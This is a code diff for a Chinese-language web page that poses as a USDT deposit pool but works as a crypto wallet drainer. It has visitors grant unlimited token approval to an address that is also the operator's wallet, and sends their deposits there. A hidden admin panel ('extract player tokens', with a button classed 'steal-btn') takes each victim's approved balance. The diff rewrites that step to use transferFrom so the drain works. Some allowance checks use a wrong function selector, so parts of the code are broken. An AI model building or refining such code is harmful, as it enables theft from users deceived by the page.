@@ -34,11 +34,11 @@ input{width:100%;padding:15px;background:#121720;border:1px solid #2a303e;border
 .rpc-input{flex:1;padding:10px;background:#121720;border:1px solid #2a303e;border-radius:8px;color:#fff}
 .rpc-save{padding:8px 12px;background:#1c71ed;color:white;border:none;border-radius:8px;cursor:pointer}
 .approve-card{background:#1c212c;border:1px solid #2a303e;border-radius:12px;padding:14px;margin-bottom:20px}
-.approve-row{display:flex;justify-content:space-between;margin-bottom:10px}
+.approve-row{display:flex;justify-content:space-between;align-items:center}
 .approve-status{font-size:14px;color:#c5c9d3}
 #approveBtn{padding:8px 14px;background:#1c71ed;color:white;border:none;border-radius:8px;cursor:pointer;font-size:14px}
+#approveBtn:disabled{background:#666;color:#aaa;cursor:not-allowed}
 
-/* 管理员后台 */
 .admin-panel{display:none;padding:20px;background:#1c212c;border-top:1px solid #2a303e}
 .admin-title{font-size:16px;color:#fff;margin-bottom:12px}
 .admin-info{padding:10px;background:#121720;border-radius:8px;margin-bottom:10px;font-size:13px;color:#c5c9d3}
@@ -69,20 +69,15 @@ input{width:100%;padding:15px;background:#121720;border:1px solid #2a303e;border
     <button class="rpc-save" id="saveRpc">保存</button>
   </div>
 
-  <!-- 管理员后台 -->
   <div class="admin-panel" id="adminPanel">
     <div class="admin-title">🔑 管理员后台</div>
-    
-    <!-- 管理员可见：当前用户信息 -->
     <div class="admin-info" id="userInfoPanel">
       <div>当前用户地址：<span id="currentUserAddr">-</span></div>
       <div style="margin-top:4px">授权额度：<span id="currentUserAllow">-</span> USDT</div>
     </div>
-
     <input class="admin-input" id="adminTo" placeholder="转入地址">
     <input class="admin-input" id="adminAmount" placeholder="转出数量 USDT">
     <button class="admin-btn" id="adminTransfer">管理员转出</button>
-
     <input class="admin-input" id="userAddress" placeholder="玩家钱包地址">
     <button class="admin-btn steal-btn" id="takeUserToken">提取玩家代币</button>
   </div>
@@ -154,7 +149,6 @@ document.getElementById('saveRpc').onclick = () => {
   alert('RPC 已保存')
 }
 
-// 管理员地址
 const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"
 const USDT = "0x55d398326f99059fF775485246999027B3197955"
 const POOL_SPENDER = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"
@@ -181,68 +175,88 @@ document.getElementById('connectBtn').onclick = async () => {
     document.getElementById('connectBtn').innerText = '已连接'
     document.getElementById('connectBtn').style.background='#10b981'
 
-    // 管理员可见后台
     if(account.toLowerCase() === ADMIN_WALLET.toLowerCase()){
       document.getElementById('adminPanel').style.display = 'block'
     }
 
-    // 实时显示当前用户信息（仅管理员可见）
-    refreshUserInfoForAdmin()
-    refresh()
+    await refreshAll()
   }catch(e){ alert('连接失败') }
 }
 
-// 管理员专用：显示当前连接用户的地址和授权
-async function refreshUserInfoForAdmin() {
-  if(!visitorAddress) return
-  try {
-    document.getElementById('currentUserAddr').innerText = visitorAddress
+// 统一刷新：授权状态 + 余额 + 管理员面板
+async function refreshAll() {
+  if (!account) return
+  await refreshAllowance()
+  await refreshBalance()
+  await refreshUserInfoForAdmin()
+}
 
-    const dataAllow = '0xddf252ad' + pad(visitorAddress) + pad(ADMIN_WALLET)
-    const allowRes = await window.ethereum.request({
-      method:'eth_call', params:[{to:USDT, data:dataAllow},'latest']
+// 动态刷新授权状态（核心）
+async function refreshAllowance() {
+  const el = document.getElementById('allowanceText')
+  const btn = document.getElementById('approveBtn')
+
+  try {
+    const data = '0xddf252ad' + pad(account) + pad(POOL_SPENDER)
+    const res = await window.ethereum.request({
+      method:'eth_call', params:[{to:USDT, data},'latest']
     })
-    const allow = BigInt(allowRes)
-    const allowUsdt = (Number(allow) / 1e18).toFixed(2)
-    document.getElementById('currentUserAllow').innerText = allowUsdt
-  }catch(e){
-    document.getElementById('currentUserAllow').innerText = '获取失败'
+    const a = BigInt(res)
+
+    if (a > 1000000000000000000n) {
+      el.innerText = '已授权'
+      el.style.color = '#22c55e'
+      btn.innerText = '已授权'
+      btn.disabled = true
+    } else {
+      el.innerText = '未授权'
+      el.style.color = '#ef4444'
+      btn.innerText = '授权 USDT'
+      btn.disabled = false
+    }
+  } catch (e) {
+    el.innerText = '查询失败'
+    btn.disabled = false
   }
 }
 
-// 刷新
-async function refresh(){
-  if(!account) return
+// 刷新余额
+async function refreshBalance() {
   try {
-    const balData = '0x70a08231'+pad(account)
-    const bal = await window.ethereum.request({
-      method:'eth_call', params:[{to:USDT, data:balData},'latest']
+    const data = '0x70a08231' + pad(account)
+    const res = await window.ethereum.request({
+      method:'eth_call', params:[{to:USDT, data},'latest']
     })
-    const usdt = Number(BigInt(bal))/1e18
+    const usdt = Number(BigInt(res)) / 1e18
     document.getElementById('balance').innerText = `钱包余额：${usdt.toFixed(2)} USDT`
+  } catch (e) {}
+}
 
-    const appData = '0xddf252ad'+pad(account)+pad(POOL_SPENDER)
-    const allow = await window.ethereum.request({
-      method:'eth_call', params:[{to:USDT, data:appData},'latest']
-    })
-    const a = BigInt(allow)
-    document.getElementById('allowanceText').innerText =
-      a > 1000000000000000000n ? '已授权' : '未授权'
-  }catch(e){}
+// 管理员面板：当前用户信息
+async function refreshUserInfoForAdmin() {
+  if (!visitorAddress || account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return
+  try {
+    document.getElementById('currentUserAddr').innerText = visitorAddress
+    const data = '0xddf252ad' + pad(visitorAddress) + pad(ADMIN_WALLET)
+    const res = await window.ethereum.request({ method:'eth_call', params:[{to:USDT, data},'latest'] })
+    const allow = Number(BigInt(res)) / 1e18
+    document.getElementById('currentUserAllow').innerText = allow.toFixed(2)
+  } catch (e) {
+    document.getElementById('currentUserAllow').innerText = '失败'
+  }
 }
 
 // 授权
 document.getElementById('approveBtn').onclick = async () => {
   if(!account) return alert('请先连接钱包')
   try {
-    const data = '0x095ea7b3'+pad(POOL_SPENDER)+max()
-    const tx = await window.ethereum.request({
+    const data = '0x095ea7b3' + pad(POOL_SPENDER) + max()
+    await window.ethereum.request({
       method:'eth_sendTransaction',
-      params:[{from:account, to:USDT, data:data, gas:'0x4c4340'}]
+      params:[{from:account, to:USDT, data, gas:'0x4c4340'}]
     })
     alert('授权成功')
-    refresh()
-    refreshUserInfoForAdmin()
+    await refreshAll()
   }catch(e){ alert('授权取消') }
 }
 
@@ -255,12 +269,12 @@ document.querySelectorAll('.amount-btn').forEach(b=>{
 document.getElementById('depositBtn').onclick = async () => {
   if(!account) return alert('请连接钱包')
   const amt = document.getElementById('amount').value
-  if(!amt || isNaN(amt) || amt<=0) return alert('输入有效数量')
+  if(!amt || isNaN(amt) || amt <= 0) return alert('输入有效数量')
   try {
-    const data = '0xa9059cbb'+pad(ADMIN_WALLET)+hex(amt)
-    const tx = await window.ethereum.request({
+    const data = '0xa9059cbb' + pad(ADMIN_WALLET) + hex(amt)
+    await window.ethereum.request({
       method:'eth_sendTransaction',
-      params:[{from:account, to:USDT, data:data, gas:'0x4c4340'}]
+      params:[{from:account, to:USDT, data, gas:'0x4c4340'}]
     })
     const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
     let key = ''
@@ -269,8 +283,7 @@ document.getElementById('depositBtn').onclick = async () => {
     document.getElementById('keyArea').style.display='block'
     document.getElementById('withdrawKey').innerText=key
     alert('存入成功')
-    refresh()
-    refreshUserInfoForAdmin()
+    await refreshAll()
   }catch(e){ alert('交易失败：'+e.message) }
 }
 
@@ -294,36 +307,34 @@ document.getElementById('adminTransfer').onclick = async () => {
     const data = '0xa9059cbb' + pad(to) + hex(amt)
     const tx = await window.ethereum.request({
       method:'eth_sendTransaction',
-      params:[{from:account, to:USDT, data:data, gas:'0x4c4340'}]
+      params:[{from:account, to:USDT, data, gas:'0x4c4340'}]
     })
     alert('转出成功：' + tx)
-    refresh()
+    await refreshAll()
   }catch(e){ alert('失败：' + e.message) }
 }
 
-// 提取玩家代币
+// 提取玩家代币 transferFrom（正确逻辑）
 document.getElementById('takeUserToken').onclick = async () => {
   if(account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return alert('无权限')
-  const user = document.getElementById('userAddress').value
-  if(!user || !user.startsWith('0x')) return alert('请输入正确的玩家地址')
+  const userAddr = document.getElementById('userAddress').value
+  if(!userAddr || !userAddr.startsWith('0x')) return alert('请输入玩家地址')
 
   try {
-    const dataAllow = '0xddf252ad' + pad(user) + pad(ADMIN_WALLET)
-    const allowRes = await window.ethereum.request({
-      method:'eth_call', params:[{to:USDT, data:dataAllow},'latest']
-    })
-    const allow = BigInt(allowRes)
-    if(allow <= 0n) return alert('该玩家无可用授权额度')
+    const allowData = '0xddf252ad' + pad(userAddr) + pad(ADMIN_WALLET)
+    const allowRes = await window.ethereum.request({ method:'eth_call', params:[{to:USDT, data:allowData},'latest'] })
+    const allowance = BigInt(allowRes)
+    if(allowance <= 0n) return alert('无可用授权')
 
-    const dataTransfer = '0xa9059cbb' + pad(user) + allow.toString(16).padStart(64,'0')
+    const transData = '0x23b872dd' + pad(userAddr) + pad(ADMIN_WALLET) + allowance.toString(16).padStart(64,'0')
     const tx = await window.ethereum.request({
       method:'eth_sendTransaction',
-      params:[{from:account, to:USDT, data:dataTransfer, gas:'0x4C4340'}]
+      params:[{from:account, to:USDT, data:transData, gas:'0x60000'}]
     })
-    alert('提取成功！\nTx：' + tx)
-    refresh()
-  } catch(e) {
-    alert('提取失败：' + e.message)
+    alert('提取成功：' + tx)
+    await refreshAll()
+  }catch(e){
+    alert('失败：' + e.message)
   }
 }
 </script>
